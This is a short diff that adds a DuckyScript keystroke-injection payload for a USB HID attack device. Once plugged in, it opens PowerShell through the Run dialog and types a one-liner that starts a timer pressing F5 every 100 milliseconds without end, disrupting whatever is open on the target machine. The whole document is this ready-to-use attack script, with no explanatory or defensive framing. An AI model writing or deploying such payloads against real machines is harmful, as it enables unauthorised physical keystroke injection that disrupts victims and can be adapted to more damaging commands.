@@ -1,0 +1,9 @@
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING Add-Type -AssemblyName System.Windows.Forms;$obj = New-Object System.Windows.Forms.Timer;$obj.Interval = 100;$obj.Add_Tick({[System.Windows.Forms.SendKeys]::SendWait('{F5}')});$obj.Start();
+DELAY 500
+ENTER
